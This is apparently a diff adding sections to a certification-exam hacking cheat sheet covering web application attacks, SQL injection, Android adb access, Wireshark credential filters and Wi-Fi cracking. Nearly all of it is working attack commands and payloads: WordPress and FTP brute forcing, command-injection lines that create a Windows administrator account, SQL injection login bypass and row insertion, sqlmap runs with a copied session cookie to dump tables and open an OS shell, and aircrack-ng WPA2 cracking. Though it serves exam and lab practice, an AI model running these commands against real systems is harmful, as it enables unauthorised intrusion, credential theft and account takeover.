@@ -159,3 +159,69 @@ Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Usern
 
 hydra -l user -P passlist.txt ftp://10.10.10.10
 ```
+#  Hacking Web Application
+```
+1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
+2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
+3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
+Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
+ 						 show options
+						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+						 set RHOSTS 10.10.10.10  (target ip)
+						 set RPORT 8080          (target port)
+						 set TARGETURI http://10.10.10.10:8080/
+						 set USERNAME admin
+4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
+			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
+5- Command Injection-  | net user  (Find users)
+ 		       | dir C:\  (directory listing)
+                       | net user Test/Add  (Add a user)
+		       | net user Test      (Check a user)
+		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
+		       | net user Test      (Once again check to see if it has become administrator)
+Now you can do a RDP connection with the given ip and the Test account which you created.
+```
+#  SQL Injections
+```
+1- Auth Bypass-  hi'OR 1=1 --
+2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
+3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
+Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
+4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
+5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
+6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
+6.1 In the shell type-   TASKLIST  (to view the tasks)
+6.2 Use systeminfo for windows to get all os version
+6.3 Use uname -a for linux to get os version
+```
+# Android
+```
+1- nmap ip -sV -p 5555    (Scan for adb port)
+2- adb connect IP:5555    (Connect adb with parrot)
+3- adb shell              (Access mobile device on parrot)
+4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
+```
+# Wireshark
+```
+tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
+tcp.flags.syn == 1   (Which machine for dos)
+http.request.method == POST   (for passwords) or click tools ---> credentials
+Also
+```
+# Find FQDN
+```
+nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
+```
+# Cracking Wi-Fi networks
+```
+Cracking Wifi Password
+aircrack-ng [pcap file] (For cracking WEP network)
+aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)
+
+```
+#  Some extra work 
+```
+Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
+Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
+```
